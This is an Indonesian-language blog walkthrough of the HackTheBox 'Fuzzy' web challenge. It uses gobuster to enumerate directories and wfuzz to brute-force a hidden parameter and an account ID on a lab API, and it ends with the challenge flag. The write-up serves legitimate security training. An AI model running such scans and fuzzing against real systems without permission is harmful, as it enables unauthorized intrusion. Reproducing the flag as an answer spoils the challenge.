---
title: "HTB Web Challenge - Fuzzy"
classes: wide
header:
  teaser: /assets/images/htb-frame.png
search: false
categories: 
  - HackTheBox Challenge
toc: true
toc_label: "Contents"
last_modified_at: 2020-04-12 14:51:00
---

## Fuzzy - Web challenge

untuk alamat yang disediakan oleh htb adalah http://docker.hackthebox.eu:31047/ dan menampilkan website seperti yang ditunjukan di bawah.

![fuzzy-web](/assets/images/htb-challenge-web-fuzzy/fuzzy-web.png)

### Directory Scanning menggunakan gobuster

scanning direktori website menggunakan tool seperti gobuster yang sudah ada di sistem operasi kali linux
```
$ gobuster 
Usage:
  gobuster [command]

Available Commands:
  dir         Uses directory/file brutceforcing mode
  dns         Uses DNS subdomain bruteforcing mode
  help        Help about any command
  vhost       Uses VHOST bruteforcing mode

Flags:
  -h, --help              help for gobuster
  -z, --noprogress        Don't display progress
  -o, --output string     Output file to write results to (defaults to stdout)
  -q, --quiet             Don't print the banner and other noise
  -t, --threads int       Number of concurrent threads (default 10)
  -v, --verbose           Verbose output (errors)
  -w, --wordlist string   Path to the wordlist

Use "gobuster [command] --help" for more information about a command.

$ gobuster dir -u http://docker.hackthebox.eu:31047/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x json,php,html,txt,git
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.hackthebox.eu:31047/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     json,php,html,txt,git
[+] Timeout:        10s
===============================================================
2020/04/12 14:02:45 Starting gobuster
===============================================================
/index.html (Status: 200)
/css (Status: 301)
/js (Status: 301)
/api (Status: 301

**snip**
```

beberapa direktori yang didapatkan antara lain, `css`, `js`, dan `api` dan beberapa direktori yang lainnya,namun untuk proses diskip. Setelah melakukan enumeration pada setiap direktori tersebut, fokus target pada direktori `api`, dimana beberapa direktori lainnya hanyalah direktori pendukung komponen website.

selanjutnya, melanjutkan scanning direktori tetap menggunakan tool yang sama, namun ditambah `api` pada target url awal

```
$ gobuster dir -u http://docker.hackthebox.eu:31047/api/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x json,php,html,txt,git
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.hackthebox.eu:31047/api/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     json,php,html,txt,git
[+] Timeout:        10s
===============================================================
2020/04/12 14:16:06 Starting gobuster
===============================================================
/index.html (Status: 200)
/action.php (Status: 200)
```

dari proses scaning direktori yang kedua, ditemukan sebuah file yang menarik yaitu `action.php`, hal ini memungkinkan untuk melakukan exploitasi lebih lanjut. namun ketika ditampilkan pada browser, terlihat bahwa sebuah `action.php` tersebut memiliki parameter yang ingin dieksekusi.

![actionphp_browser](/assets/images/htb-challenge-web-fuzzy/fuzzy-web-actiop_php.png)

### Menggunakan Wfuzz untuk Fuzzing file extension 

umumnya, parameter eksekusi pada browser seperti `action.php?[parameter]=abcde`. Untuk hal ini saya menggunakan tool `wfuzz` untuk prosess `fuzzing` parameter pada `action.php` tersebut.

```
$ wfuzz

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
*                                                      *
* Version up to 1.4c coded by:                         *
* Christian Martorella (cmartorella@edge-security.com) *
* Carlos del ojo (deepbit@gmail.com)                   *
*                                                      *
* Version 1.4d to 2.4.5 coded by:                      *
* Xavier Mendez (xmendez@edge-security.com)            *
********************************************************

Usage:  wfuzz [options] -z payload,params <url>

        FUZZ, ..., FUZnZ  wherever you put these keywords wfuzz will replace them with the values of the specified payload.
        FUZZ{baseline_value} FUZZ will be replaced by baseline_value. It will be the first request performed and could be used as a base for filtering.


Examples:
        wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z
        wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}
        wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ

Type wfuzz -h for further information or --help for advanced usage.

$ wfuzz --hh=24 -c -z file,/usr/share/wordlists/dirb/big.txt --hc 403,404 http://docker.hackthebox.eu:31047/api/action.php?FUZZ=abcde

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://docker.hackthebox.eu:31047/api/action.php?FUZZ=abcde
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                              
===================================================================

000015356:   200        0 L      5 W      27 Ch       "reset"   
```
paramater yang didapatkan adalah `reset`, sehingga path nya `action.php?reset=[]` ketika di eksekusi terjadi error dan memerlukan `account ID` agar dapat ketahap selanjutnya.

![fuzzy-action-reset](/assets/images/htb-challenge-web-fuzzy/fuzzy-web-action-reset-id.png)

eksekusi yang dilakukan hampir sama, menggunakan `wfuzz`

```
$ wfuzz --hh=27 -c -z file,/usr/share/wordlists/dirb/small.txt --hc 403,404 http://docker.hackthebox.eu:31047/api/action.php?reset=FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://docker.hackthebox.eu:31047/api/action.php?reset=FUZZ
Total requests: 959

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                              
===================================================================

000000012:   200        0 L      10 W     74 Ch       "20"       
```
didapatkan `20` sebagai account ID, sehingga dapat dieksekusi di browser

![fuzzy-id](/assets/images/htb-challenge-web-fuzzy/fuzzy-id.png)

```
flag: HTB{h0t_fuzz3r}
```
